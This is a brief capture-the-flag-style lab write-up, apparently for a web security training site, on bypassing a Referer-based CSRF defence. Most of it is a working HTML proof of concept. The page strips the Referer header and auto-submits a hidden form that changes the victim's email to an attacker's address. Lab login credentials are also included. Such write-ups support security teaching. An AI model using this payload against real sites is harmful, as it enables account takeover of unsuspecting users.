*This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter*

Used the following PoC to solve the lab, including a meta tag for `referrer`:
```html 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
	<head>
		<meta name="referrer" content="never">
	</head>
  <body>
    <form action="https://0a0e001004572bcd809ff9c2003c00ce.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hackerman&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
